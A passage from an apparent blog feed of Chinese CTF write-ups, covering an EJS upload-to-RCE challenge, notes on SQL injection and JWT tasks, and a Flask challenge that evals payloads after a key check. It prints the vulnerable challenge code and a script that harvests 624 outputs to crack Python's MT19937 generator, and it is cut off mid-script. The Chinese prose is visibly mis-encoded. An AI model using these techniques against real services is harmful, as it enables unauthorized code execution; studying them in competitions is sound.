created/updated'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Server start</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Static server is running on http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›®æ ‡æ˜¯ RCEï¼Œå…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬å¯æ§çš„ä¸œè¥¿</p><p>å½“è·¯å¾„ç»“å°¾ä¸º &#x2F; æ—¶ï¼Œè°ƒç”¨ serveIndex</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// serve index for better viewing</span><span class="token keyword">function</span> <span class="token function">serveIndex</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> templ <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">||</span> <span class="token string">'index'</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> lsPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>templ<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">filenames</span><span class="token operator">:</span> fs<span class="token punctuation">.</span><span class="token function">readdirSync</span><span class="token punctuation">(</span>lsPath<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token literal-property property">path</span><span class="token operator">:</span> req<span class="token punctuation">.</span>path        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error rendering page'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„å¯ä»¥æŒ‡å®š templ å’Œè¦ä½œä¸ºæ¨¡æ¿å‚æ•°çš„ path è·¯å¾„è¿›è¡Œ ejs æ¸²æŸ“ï¼Œä½†æ˜¯ ejs 3.1.10</p><p>æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Security middleware</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> req<span class="token punctuation">.</span>path <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>             <span class="token punctuation">(</span><span class="token keyword">typeof</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">!==</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error parsing path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">js$|\.\.</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Denied filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// Upload operation handler</span>app<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'/*'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token constant">STATIC_DIR</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File already exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error writing file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">201</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File created/updated'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PUT ä¸Šä¼ æ–‡ä»¶ï¼Œè·¯å¾„ä¸Šè¿‡æ»¤ js ç»“å°¾ã€..ï¼Œè¿™æ ·å­å°±ä¸å¥½ç”¨ express å¼•æ“è§£æç»•è¿‡äº†</p><hr><h2 id="evil-loginï¼ˆUnsolvedï¼‰"><a href="#evil-loginï¼ˆUnsolvedï¼‰" class="headerlink" title="evil_loginï¼ˆUnsolvedï¼‰"></a>evil_loginï¼ˆUnsolvedï¼‰</h2><p>åªæœ‰ä¸€ä¸ªç™»å½•çš„åŠŸèƒ½ç‚¹</p><p>guest:guest1234 ç™»å½•</p><p>å¾—åˆ° hs256 çš„ jwt</p><hr><h2 id="update-itï¼ˆUnsolvedï¼‰"><a href="#update-itï¼ˆUnsolvedï¼‰" class="headerlink" title="update_itï¼ˆUnsolvedï¼‰"></a>update_itï¼ˆUnsolvedï¼‰</h2><p>update åŠŸèƒ½ username å¤„å•å¼•å·ç›´æ¥æŠ¥é”™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">error occurred <span class="token keyword">while</span> executing <span class="token comment">### update ycb_user set username='1'' where open_id='1'### You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="é‡‘Javaï¼ˆUnsolvedï¼‰"><a href="#é‡‘Javaï¼ˆUnsolvedï¼‰" class="headerlink" title="é‡‘Javaï¼ˆUnsolvedï¼‰"></a>é‡‘Javaï¼ˆUnsolvedï¼‰</h2><p>jinjava æ¨¡æ¿</p><p>CVE-2025-59340? <a href="https://github.com/HubSpot/jinjava/security/advisories/GHSA-m49c-g9wr-hv6v">https://github.com/HubSpot/jinjava/security/advisories/GHSA-m49c-g9wr-hv6v</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;qwb å‰ç»&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/2HVCBFKdr8q7-xyAfJecbA&quot;&gt;https://mp.weixin.qq.com/s/2HVCBFKdr8q7-xyAfJecbA&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.blog.st4rr.top/writeups/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025%E5%88%9D%E8%B5%9BWriteup.pdf&quot;&gt;https://www.blog.st4rr.top/writeups/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025%E5%88%9D%E8%B5%9BWriteup.pdf&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>WMCTF2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/09/20/WMCTF2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/09/20/WMCTF2025/</id>
    <published>2025-09-20T06:40:11.000Z</published>
    <updated>2025-11-28T02:53:34.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>wmc.tf å—ï¼Œå”‰èˆèŒåƒ</p><p>å‚è€ƒï¼š</p><p>MNGA çš„ WPï¼š <a href="https://wx.zsxq.com/group/824215518412">https://wx.zsxq.com/group/824215518412</a></p><span id="more"></span><hr><h1 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token keyword">import</span> randomrd <span class="token operator">=</span> random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_random_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rd<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> generate_random_string<span class="token punctuation">(</span><span class="token punctuation">)</span>users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>a <span class="token operator">=</span> generate_random_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Username and password are required'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> username <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Username already exists'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>        user_id <span class="token operator">=</span> generate_random_string<span class="token punctuation">(</span><span class="token punctuation">)</span>        users<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">'user_id'</span><span class="token punctuation">:</span> user_id<span class="token punctuation">,</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> password    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'User registered successfully'</span><span class="token punctuation">,</span>        <span class="token string">'user_id'</span><span class="token punctuation">:</span> user_id    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Username and password are required'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>        user <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">(</span>user <span class="token keyword">for</span> user <span class="token keyword">in</span> users <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> username <span class="token keyword">and</span> user<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Invalid credentials'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">401</span>        session<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span>    session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Login successful'</span><span class="token punctuation">,</span>        <span class="token string">'user_id'</span><span class="token punctuation">:</span> user<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">'/api'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">protected_api</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>    key1 <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> key1<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'key are required'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    key2 <span class="token operator">=</span> generate_random_string<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">str</span><span class="token punctuation">(</span>key1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>key2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Not Allowed:'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>key2<span class="token punctuation">)</span> <span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">403</span>        payload <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'payload'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        <span class="token builtin">eval</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtin__'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Access granted'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user_id'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5001</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆéœ€è¦æ»¡è¶³ <code>str(key1) == str(key2)</code> æ‰èƒ½æ‰“ payloadï¼Œè€Œ key2 æ˜¯ä¸ª  <code>rd.getrandbits(32)</code>ï¼Œæ¯”è¾ƒå¤±è´¥çš„è¯ä¼šè¿”å›ä¸Šä¸€æ¬¡çš„ key2</p><p>æ—©åœ¨ python jail ä¸­æˆ‘ä»¬å°±çŸ¥é“ <code>random.getrandbits</code> é‡‡ç”¨çš„æ˜¯ MT19937 ç®—æ³•ï¼Œè¿™é‡Œæ¯æ¬¡äº§ç”Ÿ 32 bit éšæœºæ•°ï¼Œè€Œæ¯äº§ç”Ÿ 624 æ¬¡éšæœºæ•°å°±è½¬ä¸€è½¬ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬èƒ½æ‹¿åˆ° 624 ä¸ªéšæœºæ•°çš„è¯å°±èƒ½æ±‚å‡ºä¸‹ä¸€ä¸ªéšæœºæ•°</p><p>å…ˆå†™ä¸€ä¸ªè„šæœ¬è·å– 624 ä¸ªéšæœºæ•°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">"http://192.168.31.252:5001/api"</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"session"</span><span class="token punctuation">:</span>        <span class="token string">"eyJ1c2VyX2lkIjoiMTI4Nzk0NiIsInVzZXJuYW1lIjoidGVzdCJ9.aM5xqA.Kpyzj4L7dY02Oqgv8a72Mpq1o6o"</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"payload"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span>proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http://127.0.0.1:8083"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"(\d+)"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"random.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åé¢„æµ‹ï¼Œå‚è€ƒï¼š<a href="https://blog.csdn.net/qq_57235775/article/details/131168939">https://blog.csdn.net/qq_57235775/article/details/131168939</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> randcrack <span class="token keyword">import</span> RandCrack<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'random.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    l <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">]</span>arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token 